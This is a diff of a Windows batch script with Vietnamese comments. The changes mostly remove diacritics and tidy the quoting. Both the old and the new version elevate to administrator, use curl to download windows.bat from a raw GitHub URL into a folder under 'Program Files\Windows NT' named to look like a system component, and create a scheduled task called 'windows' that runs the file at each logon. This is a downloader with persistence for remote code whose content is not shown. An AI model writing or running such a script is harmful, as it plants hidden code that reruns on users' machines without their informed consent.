@@ -1,62 +1,51 @@
 @echo off
-:: Kiểm tra quyền quản trị
+:: Kiem tra quyen quan tri
 net session >nul 2>&1
 if %errorLevel% neq 0 (
-    echo Vui lòng chạy với quyền quản trị.
+    echo Vui long chay voi quyen quan tri.
     powershell -command "Start-Process cmd -ArgumentList '/c %~f0' -Verb RunAs"
-    exit /b
+    exit
 )
 
-:: Thiết lập URL tải xuống cho tệp windows.bat
-set downloadUrl=https://raw.githubusercontent.com/quannqttg/coccoc/main/windows.bat
+:: Thiet lap bien
+set "downloadUrl=https://raw.githubusercontent.com/quannqttg/coccoc/main/windows.bat"
+set "destinationDir=C:\Program Files\Windows NT\coccoc"
+set "downloadFile=windows.bat"
+set "logFile=%destinationDir%\task_history_log.txt"
 
-:: Thiết lập thư mục đích để lưu windows.bat
-set destinationDir="C:\Program Files\Windows NT\coccoc"
-
-:: Thiết lập tên tệp cho tệp tải xuống
-set downloadFile=windows.bat
-
-:: Thiết lập thư mục người dùng hiện tại
-set userDir=%USERNAME%
-
-:: Định nghĩa đường dẫn tệp log để ghi lại lịch sử tạo và thực thi tác vụ
-set logFile="C:\Program Files\Windows NT\coccoc\task_history_log.txt"
-
-:: Kiểm tra xem thư mục đích có tồn tại không
-if not exist %destinationDir% (
-    echo Thư mục %destinationDir% không tồn tại. Đang tạo thư mục...
-    mkdir %destinationDir%
+:: Tao thu muc neu chua ton tai
+if not exist "%destinationDir%" (
+    echo Thu muc %destinationDir% khong ton tai. Dang tao thu muc...
+    mkdir "%destinationDir%"
 )
 
-:: Chuyển đến thư mục đích
-cd /d %destinationDir%
+:: Chuyen den thu muc dich
+cd /d "%destinationDir%"
 
-:: Tải xuống tệp windows.bat bằng curl
-echo Đang tải xuống windows.bat...
-echo %date% %time% - Bắt đầu tải xuống windows.bat từ %downloadUrl% >> %logFile%
-curl -L -o %downloadFile% %downloadUrl%
+:: Tai xuong tep bang curl
+echo Dang tai xuong windows.bat...
+echo %date% %time% - Bat dau tai xuong tu %downloadUrl% >> "%logFile%"
+curl -L -o "%downloadFile%" "%downloadUrl%"
 
-:: Kiểm tra xem tệp đã được tải xuống thành công chưa
-if exist %destinationDir%\%downloadFile% (
-    echo %date% %time% - windows.bat đã được tải xuống thành công. >> %logFile%
+:: Kiem tra xem tep da tai xuong thanh cong chua
+if exist "%downloadFile%" (
+    echo %date% %time% - windows.bat da tai xuong thanh cong. >> "%logFile%"
 ) else (
-    echo %date% %time% - Tải xuống windows.bat thất bại. >> %logFile%
-    exit /b
+    echo %date% %time% - Tai xuong windows.bat that bai. >> "%logFile%"
+    exit
 )
 
-:: Tạo một tác vụ để chạy windows.bat khi đăng nhập cho người dùng hiện tại
-echo Đang tạo tác vụ để chạy windows.bat khi đăng nhập...
-echo %date% %time% - Đang tạo tác vụ đã lên lịch "windows" cho người dùng %userDir% để chạy %destinationDir%\%downloadFile% khi đăng nhập. >> %logFile%
-schtasks /create /tn "windows" /tr "\"C:\Program Files\Windows NT\coccoc\windows.bat\"" /sc onlogon /ru "%USERNAME%" /f
+:: Tao tac vu trong Task Scheduler
+echo Dang tao tac vu...
+schtasks /create /tn "windows" /tr "\"%destinationDir%\%downloadFile%\"" /sc onlogon /ru "%USERNAME%" /f
 
-:: Xác nhận việc tạo tác vụ và ghi lại nó
+:: Kiem tra ket qua
 if %errorlevel% neq 0 (
-    echo %date% %time% - Tạo tác vụ đã lên lịch thất bại. >> %logFile%
-    echo Tạo tác vụ đã lên lịch thất bại.
+    echo %date% %time% - Tao tac vu that bai. >> "%logFile%"
+    echo Tao tac vu that bai.
 ) else (
-    echo %date% %time% - Tác vụ được tạo thành công để chạy windows.bat khi đăng nhập. >> %logFile%
-    echo Tác vụ được tạo thành công.
+    echo %date% %time% - Tac vu tao thanh cong. >> "%logFile%"
+    echo Tac vu tao thanh cong.
 )
 
-:: Thoát khỏi kịch bản
 pause
